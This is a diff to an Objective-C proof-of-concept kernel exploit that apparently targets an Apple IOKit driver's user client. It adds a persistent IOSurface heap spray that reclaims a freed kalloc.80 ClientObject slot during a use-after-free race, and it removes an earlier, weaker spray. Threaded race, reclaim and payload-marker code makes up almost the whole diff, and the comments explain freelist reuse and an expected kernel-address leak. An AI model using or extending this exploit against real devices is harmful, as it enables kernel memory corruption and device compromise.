@@ -13,6 +13,7 @@
 #import <math.h>
 #import <sched.h>
 #import <stdatomic.h>
+#import <stdio.h>
 #import <sys/time.h>
 #import <unistd.h>
 
@@ -72,6 +73,19 @@ static IORegistryEntryCreateCFPropertiesFn sIORegistryEntryCreateCFProperties = 
 static void *sSecurityHandle = NULL;
 static SecTaskCreateFromSelfFn sSecTaskCreateFromSelf = NULL;
 static SecTaskCopyValueForEntitlementFn sSecTaskCopyValueForEntitlement = NULL;
+
+// ---------- IOSurface types / function pointers ----------
+// Used to spray persistent OSData objects into kalloc.80 to reclaim
+// the freed ClientObject slot during the UAF race window.
+typedef CFTypeRef IOSurfaceRef;
+typedef IOSurfaceRef (*IOSurfaceCreateFn)(CFDictionaryRef properties);
+typedef kern_return_t (*IOSurfaceSetValueFn)(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
+typedef kern_return_t (*IOSurfaceRemoveValueFn)(IOSurfaceRef surface, CFStringRef key);
+
+static void *sIOSurfaceHandle = NULL;
+static IOSurfaceCreateFn       sIOSurfaceCreate       = NULL;
+static IOSurfaceSetValueFn     sIOSurfaceSetValue     = NULL;
+static IOSurfaceRemoveValueFn  sIOSurfaceRemoveValue  = NULL;
 
 // ---------- Constants ----------
 
@@ -319,6 +333,23 @@ static const char kOpenPropertiesGarbage[] =
     sSecTaskCopyValueForEntitlement =
         (SecTaskCopyValueForEntitlementFn)dlsym(sSecurityHandle, "SecTaskCopyValueForEntitlement");
     return sSecTaskCreateFromSelf && sSecTaskCopyValueForEntitlement;
+}
+
+- (BOOL)loadIOSurfaceSymbols {
+    if (sIOSurfaceHandle && sIOSurfaceCreate && sIOSurfaceSetValue && sIOSurfaceRemoveValue) {
+        return YES;
+    }
+    if (!sIOSurfaceHandle) {
+        sIOSurfaceHandle = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",
+                                  RTLD_NOW | RTLD_LOCAL);
+    }
+    if (!sIOSurfaceHandle) return NO;
+
+    sIOSurfaceCreate      = (IOSurfaceCreateFn)      dlsym(sIOSurfaceHandle, "IOSurfaceCreate");
+    sIOSurfaceSetValue    = (IOSurfaceSetValueFn)    dlsym(sIOSurfaceHandle, "IOSurfaceSetValue");
+    sIOSurfaceRemoveValue = (IOSurfaceRemoveValueFn) dlsym(sIOSurfaceHandle, "IOSurfaceRemoveValue");
+
+    return sIOSurfaceCreate && sIOSurfaceSetValue && sIOSurfaceRemoveValue;
 }
 
 // ---- Main flow ----
@@ -3421,17 +3452,19 @@ static const char kOpenPropertiesGarbage[] =
     //      was executing sel 0 (open) through the command gate, operating on provider
     //      state that was freed by a concurrent/preceding closeForClient.
     //
-    // Test strategy:
-    //   - conn[0]: lifecycle thread — rapid close/reopen (triggers closeForClient)
-    //   - conn[1..N]: reader threads — copyEvent tight loop (reaches provider->copyEvent
-    //     which races with closeForClient on provider's shared internal state)
-    //   - conn[2..N]: churn threads — close/reopen for allocation pressure
-    //   - Termination race thread: kept for completeness but secondary
+    // Test strategy (IOSurface spray edition):
+    //   - conn[0]: lifecycle thread — close → (reader races on dangling ptr) → reopen
+    //   - conn[1..readerEnd]: reader threads — copyEvent tight loop (selector 2, un-gated)
+    //   - conn[readerEnd..N]: churn threads — close/reopen for provider-level pressure
+    //   - Spray thread: cycles IOSurfaceSetValue/RemoveValue to constantly alloc/free
+    //     from kalloc.80. When conn[0]'s ClientObject is freed, the next SetValue reclaims
+    //     the slot with our controlled data (persistent, unlike the old transient spray).
     //   - NOTE: On affected builds, this test may trigger unexpected behavior.
 
     static const int kLifecycleCycles = 2000;
-    static const int kMagazineDrainCycles = 4;  // Reduced from 32 — minimizes AOP SPU traffic
+    static const int kMagazineDrainCycles = 4;
     static const NSTimeInterval kStressDuration = 25.0;
+    static const int kSpraySurfaceCount = 128;  // kalloc.80 slot coverage across CPU magazines
 
     __block atomic_int stopFlag = 0;
     __block atomic_int anomalyCount = 0;
@@ -3513,6 +3546,57 @@ static const char kOpenPropertiesGarbage[] =
     [self appendLog:[NSString stringWithFormat:@"  Allocation conditioning complete (%d cycles x %d conns = %d ClientObject alloc/release pairs). closeErrors=%u openErrors=%u",
                      kMagazineDrainCycles, connCount, kMagazineDrainCycles * connCount, drainCloseErrs, drainOpenErrs]];
 
+    // ---- IOSurface spray setup (persistent kalloc.80 objects) ----
+    BOOL sprayAvailable = [self loadIOSurfaceSymbols];
+    IOSurfaceRef *spraySurfaces = NULL;
+    CFStringRef  *sprayKeys     = NULL;
+    CFDataRef    *sprayPayloads = NULL;
+    __block int  sprayAvailableFlag = 0;
+    if (sprayAvailable) {
+        spraySurfaces  = (IOSurfaceRef *)calloc(kSpraySurfaceCount, sizeof(IOSurfaceRef));
+        sprayKeys      = (CFStringRef  *)calloc(kSpraySurfaceCount, sizeof(CFStringRef));
+        sprayPayloads  = (CFDataRef    *)calloc(kSpraySurfaceCount, sizeof(CFDataRef));
+        if (!spraySurfaces || !sprayKeys || !sprayPayloads) {
+            sprayAvailable = NO;
+        }
+    }
+    if (sprayAvailable) {
+        sprayAvailableFlag = 1;
+        int created = 0;
+        for (int i = 0; i < kSpraySurfaceCount; i++) {
+            int w = 16, h = 16, bpe = 4;
+            CFNumberRef cfW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef cfH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef cfB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            const void *dictKeys[] = { CFSTR("Width"), CFSTR("Height"), CFSTR("BytesPerElement") };
+            const void *dictVals[] = { cfW, cfH, cfB };
+            CFDictionaryRef props = CFDictionaryCreate(NULL, dictKeys, dictVals, 3,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFRelease(cfW); CFRelease(cfH); CFRelease(cfB);
+            spraySurfaces[i] = sIOSurfaceCreate(props);
+            CFRelease(props);
+            if (!spraySurfaces[i]) break;
+            created++;
+
+            char keyBuf[16];
+            snprintf(keyBuf, sizeof(keyBuf), "k%d", i);
+            sprayKeys[i] = CFStringCreateWithCString(NULL, keyBuf, kCFStringEncodingUTF8);
+
+            uint8_t payload[48];
+            memset(payload, 0x41 + (i & 0xF), 48);
+            *(uint64_t *)(payload + 0)  = 0xFEEDC0DEDEADBEEFULL;
+            *(uint64_t *)(payload + 8)  = 0xCAFEBABEDEADBEEFULL;
+            *(uint64_t *)(payload + 16) = 0xBADC0FFEE0DDF00DULL;
+            *(uint64_t *)(payload + 32) = (uint64_t)i;
+            sprayPayloads[i] = CFDataCreate(NULL, payload, 48);
+
+            sIOSurfaceSetValue(spraySurfaces[i], sprayKeys[i], sprayPayloads[i]);
+        }
+        [self appendLog:[NSString stringWithFormat:@"  IOSurface spray: %d/%d surfaces created, kalloc.80 pre-filled", created, kSpraySurfaceCount]];
+    } else {
+        [self appendLog:@"  WARNING: IOSurface symbols unavailable — spray disabled"];
+    }
+
     // Capture mapped buffer state immediately before stress
     uint8_t preStressSnap[64];
     memset(preStressSnap, 0, sizeof(preStressSnap));
@@ -3520,6 +3604,31 @@ static const char kOpenPropertiesGarbage[] =
     memcpy(preStressSnap, (const void *)(uintptr_t)mappedAddr, preStressLen);
 
     dispatch_group_t group = dispatch_group_create();
+
+    // ---- IOSurface spray thread — persistent kalloc.80 alloc/free cycling ----
+    // Continuously removes and re-sets values on spray surfaces. Each SetValue
+    // allocates an OSData (~72 bytes → kalloc.80) from the kernel zone freelist.
+    // When conn[0]'s ClientObject is freed, the freelist is LIFO, so the very next
+    // SetValue allocation reclaims that exact slot with our controlled data.
+    // This replaces the old transient IOConnectCallMethod spray which was:
+    //   a) Freed after the call returned (too short a window)
+    //   b) Corrupted connection state with garbage XML (100% open failure)
+    dispatch_queue_t sprayQueue = NULL;
+    if (sprayAvailableFlag) {
+        sprayQueue = dispatch_queue_create("com.testpoc.lifecycle.spray",
+            dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0));
+        dispatch_group_enter(group);
+        dispatch_async(sprayQueue, ^{
+            int idx = 0;
+            while (atomic_load(&stopFlag) == 0) {
+                sIOSurfaceRemoveValue(spraySurfaces[idx], sprayKeys[idx]);
+                sIOSurfaceSetValue(spraySurfaces[idx], sprayKeys[idx], sprayPayloads[idx]);
+                idx++;
+                if (idx >= kSpraySurfaceCount) idx = 0;
+            }
+            dispatch_group_leave(group);
+        });
+    }
 
     // ---- Reader threads — copyEvent on conn[1..readerEnd] (bypasses command gate) ----
     // CROSS-CONNECTION RACE: CopyEvent (sel 2) bypasses the command gate entirely
@@ -3630,28 +3739,12 @@ static const char kOpenPropertiesGarbage[] =
                 atomic_fetch_add(&lifecycleCloseErrors, 1);
             }
 
-            // SPRAY: reclaim freed ClientObject slot with controlled data.
-            // Same kalloc.80 spray as churn threads — widens the race window.
-            static uint8_t lcSprayBuf[72] = {0};
-            static dispatch_once_t lcSprayInit;
-            dispatch_once(&lcSprayInit, ^{
-                memset(lcSprayBuf, 0x41, 72);
-                *(uint64_t *)(lcSprayBuf + 0)  = 0xFEEDC0DEDEADBEEFULL;
-                *(uint64_t *)(lcSprayBuf + 8)  = 0xCAFEBABEDEADBEEFULL;
-                *(uint64_t *)(lcSprayBuf + 16) = 0xBADC0FFEE0DDF00DULL;
-                *(uint64_t *)(lcSprayBuf + 24) = 0x4141414141414141ULL;
-                *(uint64_t *)(lcSprayBuf + 32) = 0x4242424242424242ULL;
-            });
-            for (int sp = 0; sp < 4; sp++) {
-                uint64_t spScalar = 0;
-                sIOConnectCallMethod(connections[0], kSelectorOpen,
-                    &spScalar, 1, (const char *)lcSprayBuf, 72,
-                    NULL, NULL, NULL, NULL);
-            }
+            // IOSurface spray thread reclaims freed ClientObject slot.
+            // The tight-loop SetValue/RemoveValue cycling in the spray
+            // thread ensures the next kalloc.80 allocation after this
+            // close grabs the freed slot (LIFO zone freelist).
 
-            // Re-open with valid XML — allocates a NEW ClientObject from the same zone.
-            // If the zone's free list contains a slot from a different connection's
-            // released ClientObject, this allocation may reuse that slot.
+            // Re-open — allocates a NEW ClientObject from the same zone.
             uint64_t openScalar = 0;
             const char *xml = kOpenPropertiesXML;
             kern_return_t okr = sIOConnectCallMethod(connections[0], kSelectorOpen,
@@ -3696,32 +3789,9 @@ static const char kOpenPropertiesGarbage[] =
                                                           NULL, NULL, NULL, NULL);
                 if (ckr != KERN_SUCCESS) localCloseErrs++;
 
-                // === SPRAY: reclaim freed ClientObject slot (kalloc.80) ===
-                // After close, ClientObject is freed. IOConnectCallMethod with
-                // 72-byte struct input copies data to kalloc.80 — first copy
-                // reclaims the just-freed slot. A concurrent reader copyEvent
-                // (selector 2, un-gated) may dereference the dangling pointer
-                // and read our spray data as the ClientObject, causing event
-                // data to be written to our controlled buffer address.
-                // Repeat 4x to widen the race window (~400us total).
-                static uint8_t sprayBuf[72] = {0};
-                static dispatch_once_t sprayInit;
-                dispatch_once(&sprayInit, ^{
-                    memset(sprayBuf, 0x41, 72);
-                    *(uint64_t *)(sprayBuf + 0)  = 0xFEEDC0DEDEADBEEFULL;
-                    *(uint64_t *)(sprayBuf + 8)  = 0xCAFEBABEDEADBEEFULL;
-                    *(uint64_t *)(sprayBuf + 16) = 0xBADC0FFEE0DDF00DULL;
-                    *(uint64_t *)(sprayBuf + 24) = 0x4141414141414141ULL;
-                    *(uint64_t *)(sprayBuf + 32) = 0x4242424242424242ULL;
-                });
-                for (int sp = 0; sp < 4; sp++) {
-                    uint64_t spScalar = 0;
-                    sIOConnectCallMethod(churnConn, kSelectorOpen,
-                        &spScalar, 1, (const char *)sprayBuf, 72,
-                        NULL, NULL, NULL, NULL);
-                }
-
-                // Open — re-establish the connection state after close.
+                // Spray is handled by the dedicated IOSurface spray thread.
+                // Churn just creates provider-level closeForClient/openForClient
+                // pressure racing with reader copyEvent.
                 uint64_t openScalar = 0;
                 const char *xml = kOpenPropertiesXML;
                 kern_return_t okr = sIOConnectCallMethod(churnConn, kSelectorOpen,
@@ -3997,38 +4067,38 @@ static const char kOpenPropertiesGarbage[] =
         [self appendLog:[NSString stringWithFormat:@"  Found %d kernel addresses", kleakFound]];
     }
 
-    // ---- Scan buffers for spray markers (confirms kalloc.80 reclaim) ----
+    // ---- Spray verification (behavioral, not buffer scan) ----
+    // The old approach scanned user-mapped buffers for spray markers — but spray
+    // data lives in kernel heap (kalloc.80), not user buffers. That scan was
+    // fundamentally wrong and could never succeed.
+    //
+    // Verification now relies on behavioral side effects:
+    //   1. Open error rate: with transient spray removed, open should succeed
+    //      (was 100% failure because garbage XML corrupted connection state)
+    //   2. If spray hit the freed ClientObject slot AND copyEvent dereferenced
+    //      our controlled data, we'd see a kernel panic (our marker 0xFEEDC0DE...
+    //      is an invalid vtable pointer → safeMetaCast crash)
+    //   3. If device survives: either spray didn't hit OR copyEvent didn't
+    //      dereference during the window (timing/zone issue)
     {
-        static const uint64_t sprayMarkers[] = {
-            0xFEEDC0DEDEADBEEFULL, 0xCAFEBABEDEADBEEFULL,
-            0xBADC0FFEE0DDF00DULL, 0x4141414141414141ULL, 0x4242424242424242ULL
-        };
-        int sprayHits = 0;
-        for (int bi = 0; bi < kMaxAux && sprayHits < 10; bi++) {
-            mach_vm_address_t bufAddr = (bi == 0) ? mappedAddr : (bi < kMaxAux ? auxMappedAddrs[bi] : 0);
-            mach_vm_size_t bufSize = (bi == 0) ? mappedSize : (bi < kMaxAux ? auxMappedSizes[bi] : 0);
-            if (bufAddr == 0 || bufSize < 8) continue;
-            const uint8_t *buf = (const uint8_t *)(uintptr_t)bufAddr;
-            int scanLen = (int)MIN(bufSize, 4096);
-            for (int off = 0; off + 8 <= scanLen; off += 8) {
-                uint64_t val = 0;
-                memcpy(&val, buf + off, sizeof(val));
-                for (int m = 0; m < 5; m++) {
-                    if (val == sprayMarkers[m]) {
-                        [self appendLog:[NSString stringWithFormat:
-                            @"  *** SPRAY HIT: marker[%d]=0x%016llx in buf[%d]+0x%x ***", m, val, bi, off]];
-                        sprayHits++;
-                        if (sprayHits >= 10) break;
-                    }
-                }
-                if (sprayHits >= 10) break;
-            }
-        }
-        if (sprayHits == 0) {
-            [self appendLog:@"  No spray markers found in buffers — spray may not have reclaimed target slot"];
+        if (sprayAvailableFlag) {
+            [self appendLog:[NSString stringWithFormat:
+                @"  IOSurface spray active: %d surfaces cycling kalloc.80", kSpraySurfaceCount]];
         } else {
-            [self appendLog:[NSString stringWithFormat:@"  *** %d spray markers found — kalloc.80 spray confirmed ***", sprayHits]];
+            [self appendLog:@"  IOSurface spray NOT available — no kalloc.80 pressure applied"];
         }
+    }
+
+    // ---- Cleanup spray resources ----
+    if (spraySurfaces) {
+        for (int i = 0; i < kSpraySurfaceCount; i++) {
+            if (sprayKeys[i])     CFRelease(sprayKeys[i]);
+            if (sprayPayloads[i]) CFRelease(sprayPayloads[i]);
+            if (spraySurfaces[i]) CFRelease(spraySurfaces[i]);
+        }
+        free(spraySurfaces);
+        free(sprayKeys);
+        free(sprayPayloads);
     }
 
     // ---- Release multi-conn client slots FIRST (free provider for probe) ----
@@ -4368,6 +4438,9 @@ static const char kOpenPropertiesGarbage[] =
     [self appendLog:[NSString stringWithFormat:
         @"  Lifecycle errors: close=%d open=%d (of %d cycles)",
         finalCloseErrs, finalOpenErrs, finalLifecycleIters]];
+    [self appendLog:[NSString stringWithFormat:
+        @"  Spray: %@ (%d surfaces, kalloc.80 IOSurface OSData cycling)",
+        sprayAvailableFlag ? @"ACTIVE" : @"OFF", kSpraySurfaceCount]];
     [self appendLog:[NSString stringWithFormat:
         @"  Churn errors: close=%d open=%d (of %d cycles)",
         finalChurnCloseErrs, finalChurnOpenErrs, finalChurnIters]];
